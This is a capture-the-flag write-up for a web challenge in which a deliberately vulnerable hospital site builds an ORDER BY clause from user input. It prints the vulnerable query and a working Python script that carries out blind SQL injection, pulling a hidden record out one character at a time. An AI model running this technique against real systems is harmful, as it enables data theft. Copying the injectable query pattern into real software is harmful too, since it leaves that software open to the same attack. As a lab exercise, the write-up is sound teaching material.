---
title: "Doctor Bye Bye"
author: "dax"
date: 2026-10-10
categories: ["Web", "FortID CTF 2026"]
tags: ["SQL Injection"]
partial_solve: false
used_ai: false
---

## Challenge

> Dr. Bye Bye has retired from St. Codd's Hospital.
>
> The hospital insists that retired records can never be displayed. Can you recover Dr. Bye Bye's private farewell note anyway?

We have a website which uses a MySQL database to store data about doctors.

## Recon

Looking at the source code provided, we can find the code that creates the `doctors` table and inserts all the data about the doctors.

```python3
connection.executescript(
    """
    CREATE TABLE doctors (
        id INTEGER PRIMARY KEY,
        slug TEXT NOT NULL UNIQUE,
        name TEXT NOT NULL,
        specialty TEXT NOT NULL,
        room TEXT NOT NULL,
        listed INTEGER NOT NULL CHECK (listed IN (0, 1)),
        farewell_note TEXT
    );

    INSERT INTO doctors VALUES
        (10, 'ada-pulse', 'Dr. Ada Pulse', 'Cardiology', 'C-101', 1, NULL),
        (30, 'max-well', 'Dr. Max Well', 'Radiology', 'R-204', 1, NULL),
        (50, 'paige-turner', 'Dr. Paige Turner', 'Neurology', 'N-303', 1, NULL),
        (70, 'ella-ment', 'Dr. Ella Ment', 'Pathology', 'P-118', 1, NULL),
        (90, 'zoe-last', 'Dr. Zoe Last', 'Emergency medicine', 'E-001', 1, NULL);
    """,
)
connection.execute(
    "INSERT INTO doctors VALUES (?, ?, ?, ?, ?, ?, ?)",
    (404, "doctor-bye-bye", "Dr. Bye Bye", "Retired", "-", 0, flag),
)
connection.commit()
```

Clearly our flag is in the `farewell_note` column of "Dr. Bye Bye".

```python3
def select_on_call(order_expression):
    query = f"""
        SELECT name, specialty, room
        FROM doctors
        WHERE listed = 1
        ORDER BY {order_expression}
        LIMIT 1
    """
```

Looking further, we find a place where user input is being directly used in a SQL query - in the `/api/on-call` route. Unfortunately, it's in an `ORDER BY` clause, which makes things slightly annoying, but not by much. This was my first time doing SQL injection in the `ORDER BY` clause, and most of my time was just spent fiddling around with SQL syntax and trying to remember how nested queries worked.

## Exploit

1. We can write a simple Python function to simplify running queries. This function runs a nested query, and sorts by a different field depending on the result of the query.

```python
def run_query(q):
    url = f"{base_url}/api/on-call?sort=CASE WHEN {q} THEN id ELSE specialty END desc"

    r = requests.get(url)
    data = r.json()
    if data['doctor']['specialty'] == 'Radiology': # the last doctor when sorted by specialty
        return False
    elif data['doctor']['name'] == 'Dr. Zoe Last': # the last doctor when sorted by id
        return True
```

2. Now we can build the flag, one character at a time, using the `SUBSTRING` function.

Our final `solve.py` script:

```python
import requests
from string import ascii_letters, digits

alphabet = ascii_letters + digits + "{}_"

base_url = "https://doctor-bye-bye-3780b9c45a0d.inst8.ctf.fortid.com" # obviously won't work for you :p

def run_query(q):
    url = f"{base_url}/api/on-call?sort=CASE WHEN {q} THEN id ELSE specialty END desc"

    r = requests.get(url)
    data = r.json()
    if data['doctor']['specialty'] == 'Radiology': # the last doctor when sorted by specialty
        return False
    elif data['doctor']['name'] == 'Dr. Zoe Last': # the last doctor when sorted by id
        return True


farewell = ''
pos = 1

while True:
    for c in alphabet:
        res = run_query(f"(SELECT SUBSTRING(farewell_note,{pos},1) FROM doctors WHERE id=404)='{c}'")
        if res:
            farewell += c
            pos += 1
            print(farewell)
            break
```

## Flag

`FortID{D0C_1M_0UTT4_H3R3_493ae316fb}`
